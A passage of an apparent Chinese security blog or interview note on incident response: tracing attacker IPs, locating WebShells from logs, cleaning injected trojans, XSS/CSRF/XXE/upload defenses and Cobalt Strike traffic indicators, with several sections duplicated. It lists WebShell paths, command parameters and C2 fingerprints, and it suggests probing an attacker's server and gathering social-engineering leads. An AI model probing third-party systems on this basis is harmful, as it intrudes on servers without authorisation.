</ul>
</li>
</ul>
<p><strong>第二步：反制</strong></p>
<p>在获取初步信息后，我们需要进行更深层次的关联分析，试图找到更多关于攻击者的线索</p>
<ul>
<li><strong>域名和 Whois 查询</strong>：如果攻击者使用了特定的域名，或者你通过日志关联到了一些域名，利用 <code>WHOIS</code> 查询这些域名的注册信息。这可能提供注册人的姓名、邮箱或电话，为后续的社工提供线索</li>
<li><strong>反向渗透</strong>：如果攻击者 IP 是云服务器，你可以对其进行<strong>有限制的反向渗透</strong><ul>
<li><strong>服务探测</strong>：探测服务器上运行的服务，看是否有未知的 WebShell、木马或 C&amp;C 通信</li>
<li><strong>目录遍历</strong>：尝试访问一些常见的 WebShell 路径或目录，看是否有意外发现</li>
<li><strong>注意</strong>：反向渗透有法律风险，必须非常谨慎，通常仅限于对公开服务进行被动侦查</li>
</ul>
</li>
<li><strong>流量和网络路径追踪</strong>：利用 <code>traceroute</code>、<code>ping</code> 等工具，可以追踪攻击流量经过的路由器、网关和 ISP 等信息。这能帮助我们了解攻击流量的来源地点，并验证其 IP 地址的真实性</li>
</ul>
<hr>
<h3 id="拿到攻击者-IP-怎么溯源-1"><a href="#拿到攻击者-IP-怎么溯源-1" class="headerlink" title="拿到攻击者 IP 怎么溯源"></a>拿到攻击者 IP 怎么溯源</h3><p><strong>第一步：信息收集</strong></p>
<p>这一步是溯源的基础，我们通过已有的安全日志和数据包，快速获取攻击者的初步信息</p>
<ul>
<li><strong>获取攻击者 IP 和攻击方式</strong>：这是溯源的起点。你需要从 Web 服务器日志、WAF、IPS、蜜罐等安全设备中，提取出攻击者的源 IP 地址，并分析其攻击方式（如 SQL 注入、命令执行、WebShell 上传等）</li>
<li><strong>威胁情报平台分析</strong>：利用威胁情报平台（如微步、安恒威胁情报中心、VirusTotal）对攻击者 IP 进行快速检测<ul>
<li><strong>判断 IP 性质</strong>：它是一个常规的云服务器、代理IP，还是已知的恶意 IP？</li>
<li><strong>获取基础信息</strong>：查看IP地址的归属地（国家、地区）、所属的 ISP（互联网服务提供商）</li>
<li><strong>端口和服务探测</strong>：利用 Shodan 等工具，探测该 IP 地址开放了哪些端口，运行着哪些服务，这有助于了解该 IP 是否被用作 C&amp;C 服务器或其他恶意用途</li>
</ul>
</li>
</ul>
<p><strong>第二步：反制</strong></p>
<p>在获取初步信息后，我们需要进行更深层次的关联分析，试图找到更多关于攻击者的线索</p>
<ul>
<li><strong>域名和 Whois 查询</strong>：如果攻击者使用了特定的域名，或者你通过日志关联到了一些域名，利用 <code>WHOIS</code> 查询这些域名的注册信息。这可能提供注册人的姓名、邮箱或电话，为后续的社工提供线索</li>
<li><strong>反向渗透</strong>：如果攻击者 IP 是云服务器，你可以对其进行<strong>有限制的反向渗透</strong><ul>
<li><strong>服务探测</strong>：探测服务器上运行的服务，看是否有未知的 WebShell、木马或 C&amp;C 通信</li>
<li><strong>目录遍历</strong>：尝试访问一些常见的 WebShell 路径或目录，看是否有意外发现</li>
<li><strong>注意</strong>：反向渗透有法律风险，必须非常谨慎，通常仅限于对公开服务进行被动侦查</li>
</ul>
</li>
<li><strong>流量和网络路径追踪</strong>：利用 <code>traceroute</code>、<code>ping</code> 等工具，可以追踪攻击流量经过的路由器、网关和 ISP 等信息。这能帮助我们了解攻击流量的来源地点，并验证其 IP 地址的真实性</li>
</ul>
<hr>
<h3 id="怎样从日志找-WebShell-位置"><a href="#怎样从日志找-WebShell-位置" class="headerlink" title="怎样从日志找 WebShell 位置"></a>怎样从日志找 WebShell 位置</h3><p><strong>第一步：排查 Web 服务器访问日志（access.log）</strong></p>
<p>WebShell 需要通过 HTTP 请求来执行命令，因此会在 Web 服务器的访问日志中留下痕迹。这是定位 WebShell 位置最直接的方法</p>
<ul>
<li><strong>异常请求状态码</strong>：一个成功的 WebShell 文件通常会被频繁访问，并返回 <code>200</code> 状态码。而正常的网站文件，尤其是那些不应该被直接访问的脚本文件，如果返回了 <code>200</code>，就很可疑</li>
<li><strong>异常请求路径</strong>：WebShell 的路径通常很奇怪，不符合正常的业务规则。例如：<ul>
<li><strong>深度目录</strong>：<code>www.example.com/images/uploads/2023/shell.php</code></li>
<li><strong>随机文件名</strong>：<code>www.example.com/1a2b3c4d.jsp</code></li>
<li><strong>伪装文件名</strong>：<code>www.example.com/test.jpg.php</code></li>
</ul>
</li>
<li><strong>异常请求参数</strong>：WebShell 的请求参数通常会包含一些命令执行的关键字，例如 <code>?cmd=...</code>、<code>?exec=...</code> 或 <code>?id=...</code></li>
<li><strong>异常 User-Agent</strong>：攻击者可能使用特定的工具或脚本来访问 WebShell，其 User-Agent 字段可能不正常</li>
</ul>
<p><strong>第二步：排查 Web 服务器错误日志（error.log）</strong></p>
<p>WebShell 可能会在运行中产生错误，这些错误通常会被记录在错误日志中</p>
<ul>
<li><strong>PHP 错误</strong>：如果一个 PHP 文件尝试执行一个它没有权限执行的操作，或者语法错误，错误日志中会记录下该文件的完整路径。例如：<code>PHP Warning: file_put_contents(/var/www/html/malicious_file.php): failed to open stream: Permission denied in /var/www/html/upload/shell.php on line 10</code></li>
<li><strong>Java 异常</strong>：对于 Java Web 应用，WebShell 可能会抛出异常，错误日志会显示异常发生的类名和路径</li>
</ul>
<p>通过这些错误信息，可以快速定位到可疑文件的具体位置</p>
<hr>
<h3 id="怎样从日志找-WebShell-位置-1"><a href="#怎样从日志找-WebShell-位置-1" class="headerlink" title="怎样从日志找 WebShell 位置"></a>怎样从日志找 WebShell 位置</h3><p><strong>第一步：排查 Web 服务器访问日志（access.log）</strong></p>
<p>WebShell 需要通过 HTTP 请求来执行命令，因此会在 Web 服务器的访问日志中留下痕迹。这是定位 WebShell 位置最直接的方法</p>
<ul>
<li><strong>异常请求状态码</strong>：一个成功的 WebShell 文件通常会被频繁访问，并返回 <code>200</code> 状态码。而正常的网站文件，尤其是那些不应该被直接访问的脚本文件，如果返回了 <code>200</code>，就很可疑</li>
<li><strong>异常请求路径</strong>：WebShell 的路径通常很奇怪，不符合正常的业务规则。例如：<ul>
<li><strong>深度目录</strong>：<code>www.example.com/images/uploads/2023/shell.php</code></li>
<li><strong>随机文件名</strong>：<code>www.example.com/1a2b3c4d.jsp</code></li>
<li><strong>伪装文件名</strong>：<code>www.example.com/test.jpg.php</code></li>
</ul>
</li>
<li><strong>异常请求参数</strong>：WebShell 的请求参数通常会包含一些命令执行的关键字，例如 <code>?cmd=...</code>、<code>?exec=...</code> 或 <code>?id=...</code></li>
<li><strong>异常 User-Agent</strong>：攻击者可能使用特定的工具或脚本来访问 WebShell，其 User-Agent 字段可能不正常</li>
</ul>
<p><strong>第二步：排查 Web 服务器错误日志（error.log）</strong></p>
<p>WebShell 可能会在运行中产生错误，这些错误通常会被记录在错误日志中</p>
<ul>
<li><strong>PHP 错误</strong>：如果一个 PHP 文件尝试执行一个它没有权限执行的操作，或者语法错误，错误日志中会记录下该文件的完整路径。例如：<code>PHP Warning: file_put_contents(/var/www/html/malicious_file.php): failed to open stream: Permission denied in /var/www/html/upload/shell.php on line 10</code></li>
<li><strong>Java 异常</strong>：对于 Java Web 应用，WebShell 可能会抛出异常，错误日志会显示异常发生的类名和路径</li>
</ul>
<p>通过这些错误信息，可以快速定位到可疑文件的具体位置’</p>
<hr>
<h3 id="网页挂马排查思路"><a href="#网页挂马排查思路" class="headerlink" title="网页挂马排查思路"></a>网页挂马排查思路</h3><p><strong>第一步：定位恶意代码位置</strong></p>
<p>挂马代码通常被注入到网站的静态页面或数据库中</p>
<ul>
<li><strong>查看网站源代码</strong>：<ul>
<li><strong>比对原始文件</strong>：从备份中恢复网站的原始文件，然后与当前服务器上的文件进行比对。使用 <code>diff</code> 或 <code>Beyond Compare</code> 等工具可以快速找出被修改过的文件</li>
<li><strong>查找可疑关键字</strong>：在网站所有文件中搜索一些可疑的 HTML 标签或 JavaScript 代码，例如：<ul>
<li><code>&lt;script&gt;</code> 标签指向外部可疑域名</li>
<li><code>&lt;iframe&gt;</code> 标签，通常是 <code>display:none</code> 或宽高为0，用于隐藏恶意页面</li>
<li><code>eval</code>、<code>document.write</code> 等可能用于动态加载恶意脚本的函数</li>
</ul>
</li>
</ul>
</li>
<li><strong>检查数据库</strong>：如果网站内容是动态生成的，攻击者可能会修改数据库中的字段（如文章内容、广告位），注入恶意代码<ul>
<li><strong>检查数据库备份</strong>：将数据库备份恢复到本地进行分析，与当前数据库进行比对</li>
<li><strong>搜索恶意代码</strong>：在数据库的 <code>content</code>、<code>description</code> 等字段中搜索 <code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code> 等关键字。</li>
</ul>
</li>
<li><strong>分析日志文件</strong>：<ul>
<li><strong>Web日志</strong>：检查 Web 服务器的访问日志（<code>access.log</code>），看是否有异常的 <code>POST</code> 请求，这可能与数据库注入有关</li>
<li><strong>操作系统日志</strong>：检查操作系统的事件日志，看是否有异常的登录或文件修改记录</li>
</ul>
</li>
</ul>
<p><strong>第二步：分析恶意代码行为</strong></p>
<p>找到恶意代码后，不要立即删除，而是先分析它的行为。这有助于我们了解攻击的完整链条</p>
<ul>
<li><strong>代码解密</strong>：挂马代码通常会经过混淆或加密，以逃避检测。你需要对代码进行解密，以还原其真实功能</li>
<li><strong>行为分析</strong>：<ul>
<li><strong>下载木马</strong>：恶意代码是否会从某个URL下载并执行可执行文件？</li>
<li><strong>漏洞利用</strong>：它是否利用了浏览器或插件（如 Flash、Java）的漏洞？</li>
<li><strong>数据窃取</strong>：它是否会窃取用户数据（如登录凭据）并发送到攻击者的服务器？</li>
</ul>
</li>
<li><strong>威胁情报查询</strong>：将恶意代码中出现的域名、IP 地址或文件哈希值提交到威胁情报平台进行查询，了解其是否与已知的恶意活动相关</li>
</ul>
<p><strong>第三步：清除与加固</strong></p>
<p>在完成分析后，就可以进行清除和加固工作</p>
<ul>
<li><p><strong>清除恶意代码</strong>：</p>
<ul>
<li><strong>删除文件</strong>：彻底删除被注入恶意代码的文件，并从备份中恢复</li>
<li><strong>修复数据库</strong>：删除数据库中被注入的恶意内容</li>
</ul>
</li>
<li><p><strong>漏洞修复</strong>：</p>
<ul>
<li><strong>程序漏洞</strong>：如果挂马是通过Web应用漏洞（如SQL注入、文件上传）实现的，需要立即修复这些漏洞</li>
<li><strong>补丁升级</strong>：升级操作系统、Web服务器、网站程序和插件到最新版本，以修补已知的安全漏洞</li>
</ul>
</li>
<li><p><strong>权限收紧</strong>：</p>
<ul>
<li><strong>最小权限原则</strong>：Web 服务器进程（如Nginx、Apache）应以低权限用户运行，限制其对文件系统的写权限</li>
<li><strong>文件权限</strong>：对网站目录和文件设置严格的读写权限，防止被再次修改</li>
</ul>
<hr>
<h3 id="XSS-防御方法"><a href="#XSS-防御方法" class="headerlink" title="XSS 防御方法"></a>XSS 防御方法</h3></li>
</ul>
<p><strong>1. 对用户输入进行严格的过滤和验证</strong></p>
<p>永远不要信任用户的任何输入</p>
<ul>
<li><strong>白名单过滤</strong>：只允许输入符合预定规则的字符。比如，如果一个输入框只用于输入姓名，那么只允许汉字、字母和空格通过</li>
<li><strong>黑名单过滤</strong>：过滤掉危险的HTML标签和属性，如 <code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;img&gt;</code> 的 <code>onerror</code> 属性等。然而，这种方法容易被绕过，不推荐作为主要的防御手段。攻击者可以通过大小写混合、特殊编码或利用不常见的HTML标签来绕过黑名单</li>
</ul>
<p><strong>2. 对输出进行编码（转义）</strong></p>
<p>这是防御 XSS 最有效、最关键的方法。当动态内容被渲染到页面时，必须对其中的特殊字符进行<strong>转义</strong>，使其失去代码的含义，而只作为纯文本显示</p>
<ul>
<li><strong>HTML实体编码</strong>：将一些HTML特殊字符转换成HTML实体，例如：<ul>
<li><code>&lt;</code> 转换为 <code>&amp;lt;</code></li>
<li><code>&gt;</code> 转换为 <code>&amp;gt;</code></li>
<li><code>&quot;</code> 转换为 <code>&amp;quot;</code></li>
<li><code>&#39;</code> 转换为 <code>&amp;#39;</code></li>
</ul>
</li>
<li><strong>不同上下文的编码</strong>：转义需要根据输出的上下文来选择不同的编码方式。<ul>
<li><strong>在HTML元素中</strong>：使用 HTML 实体编码</li>
<li><strong>在JavaScript代码中</strong>：使用 JavaScript 转义，将特殊字符转成 <code>\uXXXX</code> 的形式</li>
<li><strong>在URL参数中</strong>：使用 URL 编码，将特殊字符转成 <code>%XX</code> 的形式</li>
</ul>
</li>
</ul>
<p><strong>3. 使用HTTP响应头增强防御</strong></p>
<p>通过配置 Web 服务器或应用程序的 HTTP 响应头，可以进一步增强对 XSS 的防御</p>
<ul>
<li><strong>CSP (Content Security Policy)</strong>：这是一个强大的防御机制，它可以告诉浏览器哪些外部资源（脚本、样式、图片等）可以被加载。通过配置 CSP 策略，你可以：<ul>
<li><strong>限制脚本来源</strong>：只允许从可信域名加载 JavaScript 脚本，从而阻止外部恶意脚本的注入</li>
<li><strong>限制内联脚本</strong>：禁止执行 HTML 中的内联脚本（<code>&lt;script&gt;...&lt;/script&gt;</code>），强制所有脚本都以文件的形式加载</li>
</ul>
</li>
<li><strong>X-XSS-Protection</strong>：这是一个 HTTP 响应头，可以启用浏览器内置的 XSS 过滤器。虽然它不是一个完美的解决方案，但在一些旧版浏览器中仍然有一定作用</li>
</ul>
<hr>
<h3 id="CSRF-防御方法"><a href="#CSRF-防御方法" class="headerlink" title="CSRF 防御方法"></a>CSRF 防御方法</h3><p><strong>1. 验证 HTTP Referer</strong></p>
<p><code>Referer</code> 是 HTTP 请求头中的一个字段，它记录了请求的来源页面。通过检查 <code>Referer</code>，可以判断请求是否来自可信的域名</p>
<ul>
<li><strong>优点</strong>：简单、易于实现</li>
<li><strong>缺点</strong>：<ul>
<li><strong>不可靠</strong>：<code>Referer</code> 字段可以被伪造或被某些浏览器、安全软件禁用</li>
<li><strong>隐私问题</strong>：在某些情况下，浏览器可能不会发送 <code>Referer</code> 头，导致正常请求被阻止</li>
</ul>
</li>
</ul>
<p><strong>2. 添加 CSRF Token（推荐）</strong></p>
<p>这是防御 CSRF 最有效、最普遍的方法。CSRF Token 是一个随机生成的、只有服务器和用户端知道的令牌</p>
<ul>
<li><strong>工作原理</strong>：<ol>
<li>当用户访问一个页面时，服务器会生成一个唯一的、随机的 CSRF Token，并将其嵌入到表单中</li>
<li>当用户提交表单时，这个 Token 会随请求一起发送到服务器</li>
<li>服务器在处理请求前，会验证该 Token 是否有效。如果 Token 缺失或不匹配，请求就会被拒绝</li>
</ol>
</li>
<li><strong>优点</strong>：<ul>
<li><strong>安全性高</strong>：攻击者无法获取用户的 Token，因此无法伪造有效的请求</li>
<li><strong>可防御跨站请求</strong>：即使攻击者能诱导用户访问恶意网站，也无法获取到正确的 Token</li>
</ul>
</li>
<li><strong>实现方式</strong>：<ul>
<li><strong>Session Token</strong>：将 Token 存储在用户的 Session 中</li>
<li><strong>双重提交Cookie</strong>：将 Token 同时存放在 Cookie 和请求参数中</li>
</ul>
</li>
</ul>
<p><strong>3. 在 HTTP 头中使用自定义属性</strong></p>
<p>现代 Web 应用框架，如 Spring、Django 等，通常会内置 CSRF 防御机制。它们会在请求中添加一个自定义的 HTTP 头，并由服务器进行验证</p>
<ul>
<li><strong>工作原理</strong>：当用户发送 AJAX 请求时，框架会自动在请求头中添加一个自定义属性，如 <code>X-CSRFToken</code>。服务器在接收请求后，会验证该 Token 是否正确</li>
<li><strong>优点</strong>：<ul>
<li><strong>方便</strong>：对于使用这些框架的开发者来说，实现起来非常简单</li>
<li><strong>不受 <code>Referer</code> 影响</strong>：不依赖于浏览器的 <code>Referer</code> 头</li>
</ul>
</li>
</ul>
<p><strong>4. 验证码机制</strong></p>
<p>在一些关键操作（如修改密码、转账）中，要求用户输入验证码，可以有效防止 CSRF 攻击</p>
<ul>
<li><strong>优点</strong>：<ul>
<li><strong>安全性高</strong>：验证码需要人工输入，无法被自动化</li>
<li><strong>简单直观</strong>：用户容易理解</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li><strong>用户体验差</strong>：在每次操作时都要求输入验证码，会降低用户体验</li>
<li><strong>不适用于所有场景</strong>：不适合频繁或批量操作</li>
</ul>
</li>
</ul>
<p><strong>5. Samesite Cookie 属性</strong></p>
<p><code>SameSite</code> 是一个 HTTP Cookie 属性，它可以限制 Cookie 在跨站点请求中的发送行为</p>
<ul>
<li><p><strong>工作原理</strong>：</p>
<ul>
<li><strong>Strict</strong>：最严格的模式，浏览器在跨站点请求时不会发送 Cookie，可以有效防御 CSRF</li>
<li><strong>Lax</strong>：相对宽松的模式，在顶级导航 GET 请求（如点击链接）时会发送 Cookie，但在其他情况下不会</li>
</ul>
</li>
<li><p><strong>优点</strong>：</p>
<ul>
<li><strong>浏览器原生支持</strong>：不需要额外开发</li>
<li><strong>简单有效</strong>：可以作为 CSRF 防御的第一道防线</li>
</ul>
</li>
<li><p><strong>缺点</strong>：</p>
<ul>
<li><strong>兼容性问题</strong>：在一些旧版浏览器中可能不受支持</li>
</ul>
<hr>
<h3 id="CSRF-防御方法-1"><a href="#CSRF-防御方法-1" class="headerlink" title="CSRF 防御方法"></a>CSRF 防御方法</h3></li>
</ul>
<p><strong>1. 验证 HTTP Referer</strong></p>
<p><code>Referer</code> 是 HTTP 请求头中的一个字段，它记录了请求的来源页面。通过检查 <code>Referer</code>，可以判断请求是否来自可信的域名</p>
<ul>
<li><strong>优点</strong>：简单、易于实现</li>
<li><strong>缺点</strong>：<ul>
<li><strong>不可靠</strong>：<code>Referer</code> 字段可以被伪造或被某些浏览器、安全软件禁用</li>
<li><strong>隐私问题</strong>：在某些情况下，浏览器可能不会发送 <code>Referer</code> 头，导致正常请求被阻止</li>
</ul>
</li>
</ul>
<p><strong>2. 添加 CSRF Token（推荐）</strong></p>
<p>这是防御 CSRF 最有效、最普遍的方法。CSRF Token 是一个随机生成的、只有服务器和用户端知道的令牌</p>
<ul>
<li><strong>工作原理</strong>：<ol>
<li>当用户访问一个页面时，服务器会生成一个唯一的、随机的 CSRF Token，并将其嵌入到表单中</li>
<li>当用户提交表单时，这个 Token 会随请求一起发送到服务器</li>
<li>服务器在处理请求前，会验证该 Token 是否有效。如果 Token 缺失或不匹配，请求就会被拒绝</li>
</ol>
</li>
<li><strong>优点</strong>：<ul>
<li><strong>安全性高</strong>：攻击者无法获取用户的 Token，因此无法伪造有效的请求</li>
<li><strong>可防御跨站请求</strong>：即使攻击者能诱导用户访问恶意网站，也无法获取到正确的 Token</li>
</ul>
</li>
<li><strong>实现方式</strong>：<ul>
<li><strong>Session Token</strong>：将 Token 存储在用户的 Session 中</li>
<li><strong>双重提交Cookie</strong>：将 Token 同时存放在 Cookie 和请求参数中</li>
</ul>
</li>
</ul>
<p><strong>3. 在 HTTP 头中使用自定义属性</strong></p>
<p>现代 Web 应用框架，如 Spring、Django 等，通常会内置 CSRF 防御机制。它们会在请求中添加一个自定义的 HTTP 头，并由服务器进行验证</p>
<ul>
<li><strong>工作原理</strong>：当用户发送 AJAX 请求时，框架会自动在请求头中添加一个自定义属性，如 <code>X-CSRFToken</code>。服务器在接收请求后，会验证该 Token 是否正确</li>
<li><strong>优点</strong>：<ul>
<li><strong>方便</strong>：对于使用这些框架的开发者来说，实现起来非常简单</li>
<li><strong>不受 <code>Referer</code> 影响</strong>：不依赖于浏览器的 <code>Referer</code> 头</li>
</ul>
</li>
</ul>
<p><strong>4. 验证码机制</strong></p>
<p>在一些关键操作（如修改密码、转账）中，要求用户输入验证码，可以有效防止 CSRF 攻击</p>
<ul>
<li><strong>优点</strong>：<ul>
<li><strong>安全性高</strong>：验证码需要人工输入，无法被自动化</li>
<li><strong>简单直观</strong>：用户容易理解</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li><strong>用户体验差</strong>：在每次操作时都要求输入验证码，会降低用户体验</li>
<li><strong>不适用于所有场景</strong>：不适合频繁或批量操作</li>
</ul>
</li>
</ul>
<p><strong>5. Samesite Cookie 属性</strong></p>
<p><code>SameSite</code> 是一个 HTTP Cookie 属性，它可以限制 Cookie 在跨站点请求中的发送行为</p>
<ul>
<li><p><strong>工作原理</strong>：</p>
<ul>
<li><strong>Strict</strong>：最严格的模式，浏览器在跨站点请求时不会发送 Cookie，可以有效防御 CSRF</li>
<li><strong>Lax</strong>：相对宽松的模式，在顶级导航 GET 请求（如点击链接）时会发送 Cookie，但在其他情况下不会</li>
</ul>
</li>
<li><p><strong>优点</strong>：</p>
<ul>
<li><strong>浏览器原生支持</strong>：不需要额外开发</li>
<li><strong>简单有效</strong>：可以作为 CSRF 防御的第一道防线</li>
</ul>
</li>
<li><p><strong>缺点</strong>：</p>
<ul>
<li><strong>兼容性问题</strong>：在一些旧版浏览器中可能不受支持</li>
</ul>
<hr>
<h3 id="XXE-防御方法"><a href="#XXE-防御方法" class="headerlink" title="XXE 防御方法"></a>XXE 防御方法</h3></li>
</ul>
<p><strong>通用防御思路</strong></p>
<ul>
<li><strong>禁用外部实体（External Entities）</strong>：这是最根本的防御措施。确保你的 XML 解析器不会去解析 <code>&lt;!DOCTYPE&gt;</code> 中定义的外部实体</li>
<li><strong>禁用 DTD（Document Type Definition）</strong>：如果业务逻辑不需要 DTD，直接禁用它能彻底解决 XXE 问题</li>
<li><strong>使用最新版本的解析库</strong>：新的 XML 解析库通常会默认禁用 XXE 相关功能，或提供更安全的配置选项</li>
</ul>
<hr>
<h3 id="文件上传防御方法"><a href="#文件上传防御方法" class="headerlink" title="文件上传防御方法"></a>文件上传防御方法</h3><p><strong>1. 客户端验证</strong></p>
<p>客户端验证通常指通过 JavaScript 在前端对文件进行检查</p>
<ul>
<li><strong>优点</strong>：可以快速、友好地提示用户，减少不必要的服务器请求，提升用户体验</li>
<li><strong>缺点</strong>：非常容易绕过。攻击者可以通过抓包工具（如 Burp Suite）修改 HTTP 请求，或直接禁用 JavaScript。因此，<strong>客户端验证绝对不能作为唯一的安全措施</strong></li>
</ul>
<p>常见的客户端验证包括：</p>
<ul>
<li><strong>文件扩展名验证</strong>：检查文件的扩展名是否为允许的类型（如<code>.jpg</code>, <code>.png</code>, <code>.pdf</code>）</li>
<li><strong>MIME类型验证</strong>：检查文件的 MIME 类型（如 <code>image/jpeg</code>, <code>application/pdf</code>）</li>
<li><strong>文件大小验证</strong>：限制上传文件的大小，防止恶意文件过大导致服务器资源耗尽</li>
</ul>
<p><strong>2. 服务器端验证</strong></p>
<p>服务器端验证是防御文件上传漏洞的最后一道防线，也是最可靠的</p>
<ul>
<li><strong>文件扩展名白名单验证</strong>：<strong>强烈推荐使用白名单</strong>。只允许上传特定、已知的安全扩展名，如 <code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.zip</code> 等。<strong>绝对不要使用黑名单</strong>，因为攻击者总能找到新的绕过方式</li>
<li><strong>MIME 类型验证</strong>：在服务器端验证文件头的 MIME 类型，防止攻击者通过伪造扩展名来上传恶意文件</li>
<li><strong>文件内容检测</strong>：对上传的文件内容进行深度检查<ul>
<li><strong>图片</strong>：使用 <code>getimagesize()</code> 等函数检测文件是否为真实的图片文件</li>
<li><strong>压缩包</strong>：检查压缩包中的文件列表，确保没有可执行文件或恶意脚本</li>
</ul>
</li>
<li><strong>文件重命名</strong>：在文件上传后，对其进行重命名，通常是使用一个随机字符串或加密哈希值作为文件名，并去除原始扩展名。这能有效防止攻击者通过文件名猜测 WebShell 的路径</li>
</ul>
<p><strong>3. 文件存储与执行权限控制</strong></p>
<p>即使恶意文件侥幸通过了所有验证，我们仍然可以通过权限控制来阻止它被执行。</p>
<ul>
<li><strong>分离存储与执行</strong>：将用户上传的文件存储在<strong>非Web根目录</strong>下。这样，即使攻击者知道文件路径，也无法通过URL直接访问或执行。</li>
<li><strong>禁止执行权限</strong>：将上传文件的目录设置为<strong>不可执行</strong>。在Nginx或Apache中，可以通过配置来禁止特定目录执行脚本文件。<ul>
<li><strong>Nginx</strong>：在配置文件中添加 <code>location</code> 规则，并设置 <code>deny all;</code> 或 <code>deny execution;</code>。</li>
<li><strong>Apache</strong>：在 <code>.htaccess</code> 文件中添加 <code>php_flag engine off</code> 或类似的规则。</li>
</ul>
</li>
<li><strong>最小权限原则</strong>：Web服务器进程（如Nginx、Apache）应以低权限用户运行，并确保其对上传目录只有<strong>写入</strong>权限，而<strong>没有执行</strong>权限。</li>
</ul>
<hr>
<h3 id="文件上传防御方法-1"><a href="#文件上传防御方法-1" class="headerlink" title="文件上传防御方法"></a>文件上传防御方法</h3><p><strong>1. 客户端验证</strong></p>
<p>客户端验证通常指通过 JavaScript 在前端对文件进行检查</p>
<ul>
<li><strong>优点</strong>：可以快速、友好地提示用户，减少不必要的服务器请求，提升用户体验</li>
<li><strong>缺点</strong>：非常容易绕过。攻击者可以通过抓包工具（如 Burp Suite）修改 HTTP 请求，或直接禁用 JavaScript。因此，<strong>客户端验证绝对不能作为唯一的安全措施</strong></li>
</ul>
<p>常见的客户端验证包括：</p>
<ul>
<li><strong>文件扩展名验证</strong>：检查文件的扩展名是否为允许的类型（如<code>.jpg</code>, <code>.png</code>, <code>.pdf</code>）</li>
<li><strong>MIME类型验证</strong>：检查文件的 MIME 类型（如 <code>image/jpeg</code>, <code>application/pdf</code>）</li>
<li><strong>文件大小验证</strong>：限制上传文件的大小，防止恶意文件过大导致服务器资源耗尽</li>
</ul>
<p><strong>2. 服务器端验证</strong></p>
<p>服务器端验证是防御文件上传漏洞的最后一道防线，也是最可靠的</p>
<ul>
<li><strong>文件扩展名白名单验证</strong>：<strong>强烈推荐使用白名单</strong>。只允许上传特定、已知的安全扩展名，如 <code>.jpg</code>, <code>.png</code>, <code>.gif</code>, <code>.pdf</code>, <code>.zip</code> 等。<strong>绝对不要使用黑名单</strong>，因为攻击者总能找到新的绕过方式</li>
<li><strong>MIME 类型验证</strong>：在服务器端验证文件头的 MIME 类型，防止攻击者通过伪造扩展名来上传恶意文件</li>
<li><strong>文件内容检测</strong>：对上传的文件内容进行深度检查<ul>
<li><strong>图片</strong>：使用 <code>getimagesize()</code> 等函数检测文件是否为真实的图片文件</li>
<li><strong>压缩包</strong>：检查压缩包中的文件列表，确保没有可执行文件或恶意脚本</li>
</ul>
</li>
<li><strong>文件重命名</strong>：在文件上传后，对其进行重命名，通常是使用一个随机字符串或加密哈希值作为文件名，并去除原始扩展名。这能有效防止攻击者通过文件名猜测 WebShell 的路径</li>
</ul>
<p><strong>3. 文件存储与执行权限控制</strong></p>
<p>即使恶意文件侥幸通过了所有验证，我们仍然可以通过权限控制来阻止它被执行。</p>
<ul>
<li><strong>分离存储与执行</strong>：将用户上传的文件存储在<strong>非Web根目录</strong>下。这样，即使攻击者知道文件路径，也无法通过URL直接访问或执行。</li>
<li><strong>禁止执行权限</strong>：将上传文件的目录设置为<strong>不可执行</strong>。在Nginx或Apache中，可以通过配置来禁止特定目录执行脚本文件。<ul>
<li><strong>Nginx</strong>：在配置文件中添加 <code>location</code> 规则，并设置 <code>deny all;</code> 或 <code>deny execution;</code>。</li>
<li><strong>Apache</strong>：在 <code>.htaccess</code> 文件中添加 <code>php_flag engine off</code> 或类似的规则。</li>
</ul>
</li>
<li><strong>最小权限原则</strong>：Web服务器进程（如Nginx、Apache）应以低权限用户运行，并确保其对上传目录只有<strong>写入</strong>权限，而<strong>没有执行</strong>权限。</li>
</ul>
<hr>
<h3 id="CS-流量特征"><a href="#CS-流量特征" class="headerlink" title="CS 流量特征"></a>CS 流量特征</h3><p><strong>一、HTTP&#x2F;HTTPS 通信特征</strong></p>
<p>CS 的核心通信依赖 HTTP&#x2F;HTTPS，其请求和响应具有以下独特之处：</p>
<ul>
<li><strong>请求路径 (URI)</strong><ul>
<li><strong>默认路径</strong>：早期的 CS 版本使用如 <code>/api/rc4</code>、<code>/pixel</code> 等明显特征的路径。虽然现在已不常见，但在老旧的、未及时更新的 CS 木马中仍可能出现</li>
<li><strong>伪装路径</strong>：高级攻击者会配置 <strong>Profile</strong>，将路径伪装成正常的 URL，如 <code>/login</code>、<code>/css/main.css</code>。此时，检测的关键于<strong>路径与请求方法的合理性</strong>。例如，<code>POST /css/main.css</code> 或 <code>GET /submit</code> 都是极度可疑的行为</li>
<li><strong>长度与随机性</strong>：某些配置文件会生成长而随机的路径，例如 <code>/hjd83kalsd94jfnnasd83jklfn</code>。在高频访问中，这种随机性反而成为一种异常</li>
</ul>
</li>
<li><strong>User-Agent (UA)</strong><ul>
<li><strong>默认 UA</strong>：早期的 CS 使用一些固定的、容易被识别的 UA 字符串</li>
<li><strong>伪造 UA</strong>：攻击者会伪装成常见的浏览器 UA，如 Chrome、Firefox。然而，可以从<strong>一致性和时效性</strong>来判断：如果来自同一 C2 的所有 Beacon 都使用完全相同的、且已过时的 UA 字符串，则很可能存在 CS 攻击</li>
</ul>
</li>
</ul>
<p><strong>二、TLS 证书与指纹特征</strong></p>
<p>如果 CS 使用 HTTPS 进行通信，其 TLS&#x2F;SSL 证书会留下独特的指纹，这是非常强的检测指标</p>
<ul>
<li><strong>默认证书</strong>：CS 服务器默认使用<strong>自签名证书</strong>，其 <code>Subject</code> 字段通常带有明显的默认值，例如 <code>CN=Major C. A. Lindheim</code> 或 <code>O=Internet Widgits Pty Ltd</code></li>
<li><strong>JARM 指纹</strong>：这是一种主动 TLS 指纹识别技术。CS 的默认配置具有非常固定的 JARM 指纹。即使攻击者修改了证书的主题信息，默认的 JARM 指纹在很长一段时间内仍保持不变，这使得 JARM 成为检测 CS 最有效的手段之一</li>
<li><strong>证书透明度（CT）日志</strong>：如果攻击者使用了看似合法的域名并申请了证书，我们可以通过检查该域名是否出现在 CT 日志中，来进一步确认和溯源</li>
</ul>
<p><strong>三、请求与响应行为特征</strong></p>
<p>CS 的 HTTP 通信并非简单的请求-响应，而是一种高度规律性的“心跳”模式</p>
<ul>
